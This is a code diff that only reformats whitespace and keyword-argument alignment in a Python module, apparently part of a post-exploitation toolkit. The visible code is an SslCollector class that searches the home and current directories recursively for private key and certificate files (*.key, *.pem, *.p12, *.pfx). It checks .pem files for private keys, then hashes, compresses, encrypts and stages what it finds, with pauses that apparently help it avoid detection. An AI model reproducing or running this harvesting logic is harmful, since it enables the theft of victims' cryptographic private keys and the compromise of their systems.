@@ -1,4 +1,3 @@
-
 from __future__ import annotations
 
 import logging
@@ -10,10 +9,11 @@ from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollect
 
 _LOG = logging.getLogger(__name__)
 
+
 class SslCollector(BaseCollector):
     """
     Collect SSL private keys from the filesystem.
-    
+
     Targets:
       - *.key
       - *.pem (if contains PRIVATE KEY)
@@ -23,7 +23,7 @@ class SslCollector(BaseCollector):
     def discover(self) -> Generator[ArtifactMetadata, None, None]:
         search_roots = [Path.home(), Path.cwd()]
         patterns = ["*.key", "*.pem", "*.p12", "*.pfx"]
-        
+
         for root in search_roots:
             for p in patterns:
                 for match in root.rglob(p):
@@ -42,13 +42,13 @@ class SslCollector(BaseCollector):
             path = Path(artifact.source_path)
             if not path.exists():
                 return None
-            
-            data    = path.read_bytes()
+
+            data = path.read_bytes()
             # If it's a .pem, check if it's actually a private key
             if path.suffix == ".pem" and b"PRIVATE KEY" not in data:
                 return None
-                
-            sha256  = self._sha256(data)
+
+            sha256 = self._sha256(data)
             payload = self._compress_and_encrypt(data)
             del data
 
@@ -58,10 +58,10 @@ class SslCollector(BaseCollector):
             self._register_cleanup(stage_path)
 
             record = CollectedFile(
-                path       = str(path),
-                sha256     = sha256,
-                size_bytes = len(payload),
-                metadata   = artifact,
+                path=str(path),
+                sha256=sha256,
+                size_bytes=len(payload),
+                metadata=artifact,
             )
             self.persist_metadata(record)
             self._stagger_and_pause()
